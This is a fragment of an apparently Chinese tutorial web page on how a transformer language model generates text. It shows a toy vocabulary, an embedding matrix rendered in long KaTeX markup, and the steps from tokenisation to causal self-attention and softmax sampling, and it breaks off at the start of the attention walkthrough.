<table><thead><tr><th/><th>我</th><th>爱</th><th>学</th><th>习</th><th>!</th><th/></tr></thead><tbody><tr><td>token_id</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr></tbody></table>
<p>embedding矩阵<code>E</code>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>6</mn><mo>×</mo><mn>5</mn></mrow></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>01</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>02</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>03</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>04</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>13</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>14</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>23</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>24</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>30</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>31</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>32</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>33</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>34</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>40</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>41</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>42</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>43</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>44</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>50</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>51</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>52</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>53</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>54</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>5</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">E \in \mathbb{R}^{6\times5} = \begin{bmatrix} x_{00} &amp; x_{01} &amp; x_{02} &amp; x_{03} &amp; x_{04} \\ x_{10} &amp; x_{11} &amp; x_{12} &amp; x_{13} &amp; x_{14} \\ x_{20} &amp; x_{21} &amp; x_{22} &amp; x_{23} &amp; x_{24} \\ x_{30} &amp; x_{31} &amp; x_{32} &amp; x_{33} &amp; x_{34} \\ x_{40} &amp; x_{41} &amp; x_{42} &amp; x_{43} &amp; x_{44} \\ x_{50} &amp; x_{51} &amp; x_{52} &amp; x_{53} &amp; x_{54} \end{bmatrix}=[x_0,x_1,x_2,x_3,x_4,x_5]  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8641em;"/><span class="mord"><span class="mord mathbb">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mbin mtight">×</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:7.2001em;vertical-align:-3.35em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-5.8499em;"><span class="pstrut" style="height:9.2em;"/><span style="width:0.667em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="7.200em" viewbox="0 0 667 7200"><path d="M403 1759 V84 H666 V0 H319 V1759 v3600 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v3600 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">40</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">50</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">01</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">41</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">51</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">02</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">42</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">52</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">03</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">33</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">43</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">53</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">04</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">14</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">24</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">34</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">44</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">54</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-5.8499em;"><span class="pstrut" style="height:9.2em;"/><span style="width:0.667em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="7.200em" viewbox="0 0 667 7200"><path d="M347 1759 V0 H0 V84 H263 V1759 v3600 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v3600 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></div>
<h4 data-id="heading-3">1.2 生成过程</h4>
<p><strong>输入：</strong> 我爱学</p>
<p><strong>模型预期输出：</strong> 习!</p>
<p>下面我们来具体分析模型是怎么生成<strong>习!</strong></p>
<ol>
<li>模型通过词表<code>W</code>，将输入文字转换为<code>token_ids=[[0, 1, 2]]</code>，token_ids.shape=(1,3)=(batch_size, seq_len)</li>
<li>模型通过词嵌入层embedding矩阵<code>E</code>，将token_ids转换为词向量表示，e=\begin{bmatrix}\begin{bmatrix}x_0 &amp; x_1 &amp; x_2\end{bmatrix}\end{bmatrix}，e.shape=(1,3,5)=(batch_size, seq_len, d_model)</li>
<li>接下来需要加上位置编码，但是我们省略这个过程</li>
<li>经过Casual Self-Attention（Masked Self-Attention）</li>
<li>最后经过Linear+SoftMax进行采样</li>
</ol>
<h5 data-id="heading-4">1.2.1 Casual Self-Attention</h5>
<p>在模拟的这个注意力机制中，我们当单头注意力进行模拟</p>
